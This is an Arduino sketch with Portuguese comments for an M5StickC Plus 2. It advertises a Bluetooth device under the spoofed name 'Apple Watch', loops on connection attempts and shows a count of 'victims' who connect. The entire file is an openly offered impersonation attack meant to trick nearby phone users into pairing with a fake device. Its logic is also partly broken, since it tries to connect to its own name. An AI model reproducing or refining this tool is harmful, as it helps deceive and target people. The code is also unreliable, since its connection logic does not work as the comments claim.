#include <M5StickCPlus2.h>
#include <BluetoothSerial.h>

BluetoothSerial SerialBT;

// Nome do dispositivo que será spoofed
const char* deviceName = "Apple Watch"; // Nome do dispositivo que será apresentado
int victimCount = 0; // Contador de vítimas

void setup() {
    // Inicializa o M5StickC Plus 2
    M5.begin();
    Serial.begin(115200);

    // Inicializa o Bluetooth
    SerialBT.begin(deviceName);
    Serial.println("Bluetooth iniciado. Nome do dispositivo: " + String(deviceName));
}

void loop() {
    // Simula uma solicitação de conexão ao smartphone
    Serial.println("Enviando solicitação de conexão ao Apple Watch...");
    SerialBT.connect(deviceName); 
    delay(5000); // Aguarda 5 segundos antes de tentar novamente

    // Verifica se há novos clientes Bluetooth
    if (SerialBT.hasClient()) {
        victimCount++; // Incrementa o contador de vítimas

        // Mostra o número de vítimas na tela do M5StickC Plus 2
        M5.Lcd.fillScreen(BLACK);
        M5.Lcd.setTextColor(WHITE);
        M5.Lcd.setTextSize(2);
        M5.Lcd.setCursor(10, 10);
        M5.Lcd.printf("Vítimas: %d", victimCount);
        
        // Aguarda um tempo para evitar múltiplas contagens
        delay(500); // Aguarda 0.5 segundos antes de verificar novamente
    }
}
